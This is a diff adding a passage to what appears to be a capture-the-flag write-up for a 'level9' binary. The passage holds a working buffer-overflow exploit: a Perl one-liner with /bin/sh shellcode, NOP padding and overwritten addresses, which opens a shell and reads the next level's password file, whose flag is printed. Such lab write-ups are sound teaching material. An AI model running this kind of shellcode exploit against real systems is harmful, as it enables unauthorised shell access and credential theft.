@@ -49,3 +49,19 @@ f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 ```
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 ```
+
+
+---
+
+```
+// print "shellcode + offset(108-size(shellcode)) + address to call eax
+
+p 0x804a00c + 4
+$1 = 0x804a010
+
+r $(perl -e 'print "\x10\xa0\x04\x08" . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" . "\x90"x(108-28-4) . "\x0c\xa0\x04\x08"')
+
+./level9 $(perl -e 'print "\x10\xa0\x04\x08" . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" . "\x90"x(108-28-4) . "\x0c\xa0\x04\x08"')
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
